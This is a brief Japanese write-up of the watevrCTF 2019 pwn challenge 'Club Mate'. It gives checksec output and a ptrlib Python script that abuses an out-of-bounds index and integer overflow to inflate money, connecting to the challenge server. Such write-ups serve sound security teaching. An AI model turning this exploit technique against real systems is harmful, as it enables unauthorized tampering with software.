# [pwn 144pts] Club Mate - watevrCTF 2019
64ビットバイナリで、SSP以外有効です。
```
$ checksec -f Club_Mate
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      No      0               1       Club_Mate
```
OOBとInteger Overflowを使ってお金を増やします。
```pythonm
from ptrlib import *

def buy(index):
    sock.sendline(str(index))
    sock.sendline("$4")
def ret(index):
    sock.sendline(str(index))
    sock.sendline("yes")

elf = ELF("./Club_Mate")
#sock = Process(["stdbuf", "-o0", "-i0", "./Club_Mate"])
sock = Socket("13.48.178.241", 50000)

buy(0)
ret(0)
for i in range(1, 15):
    buy(i)
for i in range(113):
    buy(-4)
buy(0)

sock.interactive()
```

# 感想
簡単ですがrevが面倒です。
